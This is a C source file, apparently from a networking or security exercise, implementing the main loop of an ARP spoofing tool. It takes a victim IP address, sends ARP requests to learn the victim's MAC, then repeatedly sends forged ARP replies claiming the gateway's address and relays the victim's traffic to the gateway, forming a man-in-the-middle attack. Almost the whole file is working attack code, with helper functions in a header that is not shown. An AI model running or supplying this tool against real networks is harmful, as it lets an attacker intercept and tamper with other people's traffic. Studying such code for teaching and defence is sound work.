#include "send_arp.h"

void timer_handler (int signum)
{
        static int count = 0;
        printf("timer expired %d timers\n", ++count);
}

int main(int argc, char* argv[]){
	struct in_addr      myIp,	GWIp,	victimIp;
    struct ether_addr   myMac,	victimMac, GWMac;
    struct ether_addr	broadcastMac;
	pcap_t 		*pcd;					// packet descriptor
	char 		*device;				// device name
	FILE 		*fp;
	int 		i=0;
	char 		buf[20] = {0};
	const u_char* packet;
	
	// program usage
	if(argc != 2){
		printf("program usage: %s <victim ip>\n", argv[0]);
		return -1;
	}

	// check if the target ip is invalid
    if(inet_aton(argv[1], &victimIp) == 0){
        printf("No such IP : %s\n", argv[1]);
        return -1;
    }

    // broadcastMac initialization
    for(i=0;i<ETHER_ADDR_LEN;i++){
    	broadcastMac.ether_addr_octet[i] = 0xff;
    }

    /* FIRST SESSION for [victim(sender) > gateway(target)] */
    // initialize the pcd
    pcd_init(&pcd, &device);
	// get my ip, mac_address from ifconfig result
	getMyIpMac(&myMac, &myIp);
	// get Gateway IP
	getGWIp(&GWIp);
	// send ARP request to get victim MAC
	ARPrequest(victimIp, myMac, myIp, pcd);	
	// get ARP reply, filtering it to get correct reply
	//pcapCapture(&victimIp);
	pcapCapture(&victimIp,  device, pcd, packet);
	// read mac from the file to send ARP which will infect the victim
	fp = fopen("targetmac.txt", "r"); 
	if(fp == NULL){
		printf("file open error");
	}
	fgets(buf, sizeof(buf), fp);
	ether_aton_r(buf, &victimMac);
	fclose(fp);

	struct sigaction sa;
    struct itimerval timer;
	struct pcap_pkthdr *pkthdr;

    // Install timer_handler as the signal handler for SIGVTALRM.
    memset (&sa, 0, sizeof (sa));
    sa.sa_handler = &timer_handler;
    sigaction (SIGVTALRM, &sa, NULL);
    timer.it_value.tv_sec = 10;
    // ... and every 250 msec after that.
    timer.it_interval.tv_sec = 10;
    // Start a virtual timer. It counts down whenever this process is executing.
    setitimer (ITIMER_VIRTUAL, &timer, NULL);

	while(1){
		int ispacket = 0;
		ispacket = pcap_next_ex(pcd, &pkthdr, &packet);
		if(ispacket < 0){
			printf("packet_next error\n");
			return 0;
		}
		else if(ispacket == 0)	continue;

		if( ( isbroadcast(packet, GWIp) ) || ( isbroadcast(packet, victimIp) ) ) {
			sleep(1);	// after sender get the reply from the GW
			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
		}

		//victim->GW가 있으면 잡기. 만약 잡히면 수정해서(source mac) relay
		pcap_victiom_to_GW(victimIp, GWIp, myMac, myIp, device, pcd, packet);
/*
		struct ether_header *eth2;   // ethernet header struct
    	struct ip *iph2;				// ip header struct

		eth2 = (struct ether_header *)packet;
		packet = packet + sizeof(struct ether_header);

		// is it to the GW ip?
		if(ntohs(eth2->ether_type) == ETHERTYPE_IP){
			iph2 = (struct ip *) packet;
			if(memcmp(&(iph2->ip_dst), &GWIp, sizeof(struct in_addr)) == 0){
				printf("*******Is really IP switched          : %s\n", inet_ntoa(iph2->ip_src));
				printf("*******Source MAC      : %02X:%02X:%02X:%02X:%02X:%02X\n", eth2->ether_shost[0], eth2->ether_shost[1], eth2->ether_shost[2], eth2->ether_shost[3], eth2->ether_shost[4], eth2->ether_shost[5]);
			}
		}
*/	
	}
	// get the packet [victim(sender) > Gateway(target)]

	pcap_close(pcd);

	return 1;
}